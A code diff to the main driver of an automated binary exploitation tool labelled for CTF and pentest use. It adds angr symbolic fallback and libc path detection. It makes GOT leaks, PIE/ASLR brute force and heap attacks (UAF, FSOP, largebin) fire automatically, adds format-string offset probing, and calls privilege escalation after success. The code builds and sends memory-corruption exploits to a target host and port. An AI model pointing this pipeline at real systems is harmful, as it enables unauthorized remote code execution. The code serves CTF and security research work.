@@ -63,6 +63,24 @@ def _banner() -> str:
         "[dim]Authorized use only: CTF · pentest · security research[/]"
     )
 
+
+def _norm_libc_ver(v):
+    """Normalize a glibc version string to a parseable 'M.N'.
+
+    Returns '2.31' (a safe, hooks-present default) when the value is
+    unknown/empty/unparseable. This prevents the heap/FSOP paths from
+    silently treating a failed detection as 2.34+ and building broken
+    FSOP payloads against removed hooks. Fail-fast > wrong payload.
+    """
+    if not v or str(v).strip().lower() in ("unknown", "none", ""):
+        return "2.31"
+    try:
+        parts = str(v).split(".")
+        return f"{int(parts[0])}.{int(parts[1])}"
+    except (ValueError, IndexError):
+        return "2.31"
+
+
 # ── CLI parser ────────────────────────────────────────────────────────────────
 
 def _build_parser() -> argparse.ArgumentParser:
@@ -162,6 +180,9 @@ def _build_parser() -> argparse.ArgumentParser:
                      help="Force ret2mprotect (make memory executable)")
     adv.add_argument("--off-by-one", action="store_true", dest="off_by_one",
                      help="Detect and exploit off-by-one / off-by-null heap overflows")
+    adv.add_argument("--libc-path", default=None, dest="libc_path",
+                     help="Path to target libc.so for dynamic symbol extraction "
+                          "(auto-detected via ldd if omitted)")
     adv.add_argument("--angr", action="store_true",
                      help="Symbolic execution to find win() path")
     adv.add_argument("--adaptive-timeout", action="store_true", dest="adaptive_timeout",
@@ -250,17 +271,21 @@ def run_binary(cfg):
         _cache_mod.load_cache = lambda *a, **k: None  # disable reads
 
     # ── angr path exploration (before classic analysis) ────────────────
+    # --angr runs angr up front; the result is stored in _angr_result for
+    # reuse as a last-resort fallback below. Auto-angr (stripped binaries
+    # the fast path can't solve) fires later, once we know if symbols exist.
+    _angr_result = None
     if getattr(cfg, "use_angr", False):
         log.info("[angr] Running symbolic exploration…")
-        angr_result = angr_find_win(cfg.binary, timeout=90)
-        if angr_result["found"]:
-            log.info(f"[angr] Win path found: {angr_result['notes']}")
-            if angr_result.get("offset_hint"):
-                log.info(f"[angr] Offset hint: {angr_result['offset_hint']}")
-            if angr_result.get("win_addr"):
-                log.info(f"[angr] Win addr: {hex(angr_result['win_addr'])}")
+        _angr_result = angr_find_win(cfg.binary, timeout=90)
+        if _angr_result["found"]:
+            log.info(f"[angr] Win path found: {_angr_result['notes']}")
+            if _angr_result.get("offset_hint"):
+                log.info(f"[angr] Offset hint: {_angr_result['offset_hint']}")
+            if _angr_result.get("win_addr"):
+                log.info(f"[angr] Win addr: {hex(_angr_result['win_addr'])}")
         else:
-            log.info(f"[angr] {angr_result['notes']}")
+            log.info(f"[angr] {_angr_result['notes']}")
 
     # ── Adaptive timeout ──────────────────────────────────────────────────
     _at = None
@@ -309,12 +334,33 @@ def run_binary(cfg):
         except Exception as _e:
             log.error(f"[debug] GDB launch failed: {_e}")
 
+    # angr CFGFast recovery is opt-in (expensive); r2 + prologue scan run by default
+    analyzer.use_angr = getattr(cfg, "angr", False)
+
     findings, target_function, functions = analyzer.static_analysis()
     if not functions:
-        log.error("No functions detected — cannot proceed.")
-        print_summary(None, None, None, "None", "Failed", None, None,
-                      ["Run: r2 -c afl <binary> to verify functions"])
-        return
+        # Last-chance: angr symbolic exploration can discover a win function
+        # even when r2 + prologue scan find nothing (stripped PIE, no strings).
+        log.warning("No functions detected — trying angr symbolic recovery…")
+        try:
+            _angr_result = _angr_result or angr_find_win(cfg.binary, timeout=60)
+        except Exception as _ae:
+            log.warning(f"[angr] recovery failed: {_ae}")
+        if _angr_result and _angr_result.get("win_addr"):
+            _wa = _angr_result["win_addr"]
+            # Inject the angr-discovered win address as a recovered function.
+            # find_win_addr (win_detector) scans _recovered_functions with
+            # analyze_function_for_shell, so it will target this address.
+            # _recovered_functions is populated from `functions` below (line ~383).
+            functions = [("angr_win", _wa)]
+            target_function = "angr_win"
+            log.info(f"[angr] Injected win candidate @ {hex(_wa)} — continuing")
+        else:
+            log.error("No functions detected — cannot proceed.")
+            print_summary(None, None, None, "None", "Failed", None, None,
+                          ["Run: r2 -c afl <binary> to verify functions",
+                           "Try --angr for symbolic execution"])
+            return
 
     # Use correct binary metadata detection (ET_DYN for PIE, etc.)
     _bi = full_binary_info(cfg.binary)
@@ -325,6 +371,17 @@ def run_binary(cfg):
     nx  = _bi.get("nx", nx)
     relro = _bi.get("relro", relro)
     canary_enabled = _bi.get("canary", canary_enabled)
+
+    # Stripped? (no ELF symbols) — gates the angr auto-fallback below. The
+    # fast win-detection path is weak on stripped binaries, so angr symbolic
+    # exploration is auto-tried there as a last resort. Non-stripped binaries
+    # that fail for other reasons (network, etc.) do NOT trigger a slow angr
+    # run; pass --angr to force it.
+    try:
+        from pwn import ELF as _ELF_s
+        _is_stripped = not _ELF_s(cfg.binary, checksec=False).symbols
+    except Exception:
+        _is_stripped = not functions
 
     fuzzer    = Fuzzer(cfg.binary, cfg.host, cfg.port, cfg.log_file, platform)
 
@@ -339,6 +396,24 @@ def run_binary(cfg):
     exploiter = ExploitGenerator(cfg.binary, platform, cfg.host, cfg.port,
                                   cfg.log_file, cfg.tls, cfg.binary_args,
                                   win_names=win_names, offset_range=offset_range)
+
+    # ── libc path: explicit > auto-detect (ldd) > None ───────────────────
+    # Wiring libc_path re-enables dynamic symbol extraction in resolve_from_leak,
+    # find_libc_symbols, and _resolve_libc_symbol (otherwise self.libc_path=None
+    # silently forces libc.rip/fallback-DB paths everywhere).
+    _libc_path = getattr(cfg, "libc_path", None)
+    if not _libc_path:
+        try:
+            from analyzer.libc_db import find_libc_path as _find_libc_path
+            _libc_path = _find_libc_path(cfg.binary)
+            if _libc_path:
+                log.info(f"[libc] Auto-detected libc: {_libc_path}")
+        except Exception as _lpe:
+            log.debug(f"[libc] auto-detect failed: {_lpe}")
+    exploiter.libc_path = _libc_path
+    # Share recovered function addresses (incl. stripped-binary recovery) with
+    # the win detector so analyze_function_for_shell can run on real addresses.
+    exploiter._recovered_functions = functions
 
     # Smart seccomp detection (no seccomp-tools required)
     _seccomp_info = {"has_seccomp": False, "orw_needed": False, "allowed_syscalls": []}
@@ -434,7 +509,13 @@ def run_binary(cfg):
 
     # ── Multi-stage exploit ────────────────────────────────────────────
     # ── Multi-symbol libc leak ────────────────────────────────────────────
-    if getattr(cfg, "multisym_leak", False) and not udp_spawn_mode and not http_spawn_mode and offset is not None:
+    # Auto-trigger for NX+ASLR targets with no known libc base: a precise
+    # multi-symbol GOT leak resolves base_addr before the orchestrator runs,
+    # so ret2libc/ORW can use the real base instead of guessing. ret2win
+    # (when present) still wins first inside create_exploit, so this only
+    # affects leak-dependent paths. Harmless one-connection probe otherwise.
+    _multisym_auto = (nx and aslr and not base_addr)
+    if (getattr(cfg, "multisym_leak", False) or _multisym_auto) and not udp_spawn_mode and not http_spawn_mode and offset is not None:
         log.info("[multisym] Leaking multiple GOT symbols for precise fingerprinting…")
         try:
             from pwn import ELF as _MEL, ROP as _MROP
@@ -468,7 +549,7 @@ def run_binary(cfg):
             # Auto-exploit the off-by-one/null
             try:
                 _obo_chain = exploiter.exploit_off_by_one(
-                    _obo.get("crash_size", offset), base_addr or 0, offsets, lib_version or "2.31")
+                    _obo.get("crash_size", offset), base_addr or 0, offsets, _norm_libc_ver(lib_version))
                 if _obo_chain and cfg.test_exploit:
                     _obo_ok, _ = exploiter._check_rce(_obo_chain)
                     if _obo_ok:
@@ -652,12 +733,22 @@ def run_binary(cfg):
         return
 
     # ── Brute-force ASLR ─────────────────────────────────────────────────
-    if getattr(cfg, "brute_aslr", False) and offset is not None and not udp_spawn_mode and not http_spawn_mode:
-        log.info("[brute_aslr] Starting ASLR brute force…")
+    # Auto-trigger for fork-server PIE+ASLR targets with no leak: a fork
+    # server reuses the parent's randomized base across children, so the PIE
+    # base can be brute-forced byte-by-byte across connections. The `pie`
+    # guard is essential — no-PIE binaries have a fixed base (no brute
+    # needed) and the local test bins are all no-PIE fork-servers; without
+    # `pie` this would fire a 128-attempt brute for every gate test and hang.
+    _brute_auto = (is_fork and pie and aslr and not base_addr)
+    _brute_want = getattr(cfg, "brute_aslr", False) or _brute_auto
+    if _brute_want and offset is not None and not udp_spawn_mode and not http_spawn_mode:
+        _ba_attempts = 128 if _brute_auto else getattr(cfg, "brute_attempts", 256)
+        log.info(f"[brute_aslr] Starting ASLR brute force "
+                 f"({'auto' if _brute_auto else 'manual'}, max={_ba_attempts})…")
         from analyzer.libc_db import get_one_gadgets, LIBC_DB
         ba_ok, ba_type = exploiter.brute_aslr_auto(
             offset=offset, canary=canary, pie=pie, nx=nx,
-            max_attempts=getattr(cfg, "brute_attempts", 256))
+            max_attempts=_ba_attempts, is_fork=is_fork)
         if ba_ok:
             log.info(f"[brute_aslr] ✓ RCE via {ba_type}")
             print_summary(offset, stack_addr, None, ba_type, "Success",
@@ -737,7 +828,7 @@ def run_binary(cfg):
         if cfg.test_exploit:
             log.info("[largebin] Building + firing largebin attack…")
             try:
-                _lb_ok = exploiter.largebin_attack(offset, base_addr or 0, offsets, lib_version or "2.35")
+                _lb_ok = exploiter.largebin_attack(offset, base_addr or 0, offsets, _norm_libc_ver(lib_version))
                 if _lb_ok:
                     print_summary(offset, stack_addr, None, "largebin_attack", "Success",
                                   canary, target_function, ["Largebin attack succeeded"],
@@ -759,7 +850,24 @@ def run_binary(cfg):
             if fmt_payload:
                 log.info(f"[fmtstr] Advanced payload: {len(fmt_payload)}B ({_fmt_type})")
         else:
-            fmt_payload = exploiter.generate_format_string_payload(offset, relro)
+            # Partial RELRO basic path: the fmtstr arg index (where our input
+            # lands on the stack) is NOT the buffer-overflow crash offset.
+            # Prefer the auto-detected index from --detect-vuln, else probe.
+            _fmt_idx = None
+            if _vuln_info and getattr(_vuln_info, "format_string_offset", None):
+                _fmt_idx = _vuln_info.format_string_offset
+            if not _fmt_idx:
+                try:
+                    with quiet_pwntools():
+                        _probe = exploiter.fmtstr_probe(max_index=40)
+                    _fmt_idx = _probe.get("offset") if _probe else None
+                except Exception as _fpe:
+                    log.debug(f"[fmtstr] probe failed: {_fpe}")
+            if _fmt_idx:
+                log.info(f"[fmtstr] Using arg index {_fmt_idx} (detected/probed)")
+                fmt_payload = exploiter.generate_format_string_payload(_fmt_idx, relro)
+            else:
+                fmt_payload = exploiter.generate_format_string_payload(offset, relro)
 
     if cfg.return_addr:
         return_addr = int(cfg.return_addr, 16)
@@ -781,18 +889,9 @@ def run_binary(cfg):
                           nx=nx, pie=pie, relro=relro, canary_enabled=canary_enabled, aslr=aslr)
             return
 
-    if cfg.heap_exploit and findings["heap_functions"]:
-        exploiter.create_heap_exploit(offset, base_addr, offsets, lib_version or "2.31")
-    if findings["heap_functions"]:
-        exploiter.create_uaf_exploit(offset, base_addr, offsets)
-
-    # ── Heap advanced (tcache/FSOP/House of *) ───────────────────────────────
-    if getattr(cfg, "heap_advanced", False) and offset is not None and not udp_spawn_mode and not http_spawn_mode:
-        log.info("[heap_adv] Running advanced heap auto-exploit…")
-        try:
-            exploiter.heap_exploit_auto(offset, canary, base_addr, offsets, lib_version or "2.31")
-        except Exception as _hae:
-            log.warning(f"[heap_adv] {_hae}")
+    # (heap basic/advanced moved BELOW create_exploit — see heap fallback
+    #  block. Running them here could crash the forked service before
+    #  ret2win/ret2libc confirm RCE.)
 
     # (dry-run removed: create_exploit is called below with test_exploit flag)
     success, exploit_type, used_function = None, None, None
@@ -867,8 +966,33 @@ def run_binary(cfg):
             file_input=cfg.file_input, canary=canary, relro=relro,
             safeseh=safeseh, cfg=cfg_flag,
             findings=findings, base_addr=base_addr, offsets=offsets,
-            libc_version=lib_version or "2.31", pie=pie,
+            libc_version=_norm_libc_ver(lib_version), pie=pie,
             force_srop=cfg.force_srop, force_orw=cfg.force_orw, flag_path=cfg.flag_path)
+
+    # ── Heap fallback (only if the stack exploit didn't succeed) ──────────
+    # Run AFTER create_exploit so a heap payload can't crash the forked
+    # service before ret2win/ret2libc confirm RCE. t5/t11/t13 win via
+    # ret2win and skip this entirely. Auto-triggers advanced heap (not just
+    # with --heap-advanced) when heap functions are detected and the stack
+    # path failed — closes the heap automation gap without a manual flag.
+    if findings["heap_functions"] and not success and not udp_spawn_mode and not http_spawn_mode:
+        log.info("[heap] Stack exploit failed — trying heap fallback")
+        if cfg.heap_exploit:
+            try:
+                exploiter.create_heap_exploit(offset, base_addr, offsets, _norm_libc_ver(lib_version))
+            except Exception as _hbe:
+                log.debug(f"[heap] basic: {_hbe}")
+        try:
+            exploiter.create_uaf_exploit(offset, base_addr, offsets)
+        except Exception as _hue:
+            log.debug(f"[heap] uaf: {_hue}")
+        if offset is not None:
+            try:
+                exploiter.heap_exploit_auto(offset, canary, base_addr, offsets,
+                                            _norm_libc_ver(lib_version),
+                                            menu_script=_menu_script)
+            except Exception as _hae:
+                log.warning(f"[heap_adv] {_hae}")
 
     # Pull banner-leaked stack addr and fast-path win addr from exploiter
     if not stack_addr:  # also catches stack_addr=0 from failed detection
@@ -914,6 +1038,45 @@ def run_binary(cfg):
 
     if success and cfg.privilege_escalation:
         exploiter.attempt_privilege_escalation()
+
+    # ── angr-solved fallback (last resort) ──────────────────────────────
+    # When every standard path (ret2win/ret2libc/heap/CFI) failed, angr
+    # symbolic exploration may still recover a concrete stdin that reaches
+    # win(). Auto-triggers for stripped binaries (weak fast win-detection)
+    # or when --angr was requested. Gate bins all succeed via the fast path,
+    # so `not success` is False for them and this never fires — keeping the
+    # gate fast and honest (no angr masking regressions).
+    if (not success) and cfg.test_exploit and not udp_spawn_mode and not http_spawn_mode:
+        _angr_auto = _is_stripped or getattr(cfg, "use_angr", False)
+        if _angr_auto:
+            if not (_angr_result and _angr_result.get("found")):
+                try:
+                    log.info("[angr] Last-resort symbolic exploration…")
+                    _angr_result = angr_find_win(cfg.binary, timeout=60)
+                except Exception as _ae:
+                    log.warning(f"[angr] fallback failed: {_ae}")
+                    _angr_result = {"found": False}
+            if _angr_result and _angr_result.get("found") and _angr_result.get("input_bytes"):
+                _ai = _angr_result["input_bytes"]
+                log.info(f"[angr] Trying angr-solved input ({len(_ai)}B)…")
+                try:
+                    # STRICT win-marker check: angr inputs are speculative, so
+                    # only accept if the real service echoes a win marker.
+                    # _check_rce treats any non-empty response as success
+                    # (fine for brute, too lenient here) — verify explicitly.
+                    _aout = exploiter._send_recv(_ai, timeout=5.0)
+                    from constants import WIN_MARKERS
+                    if _aout and any(_m in _aout for _m in WIN_MARKERS):
+                        log.info("[angr] ✓ RCE via angr-solved input")
+                        success = True
+                        exploit_type = "angr_solved"
+                        if _angr_result.get("offset_hint") and not offset:
+                            offset = _angr_result["offset_hint"]
+                        suggestions.append("angr symbolic execution solved the path")
+                    else:
+                        log.info("[angr] solved input did not reproduce win on service")
+                except Exception as _ase:
+                    log.debug(f"[angr] send failed: {_ase}")
 
     # ── Template generator ─────────────────────────────────────────────
     if getattr(cfg, "template", False):
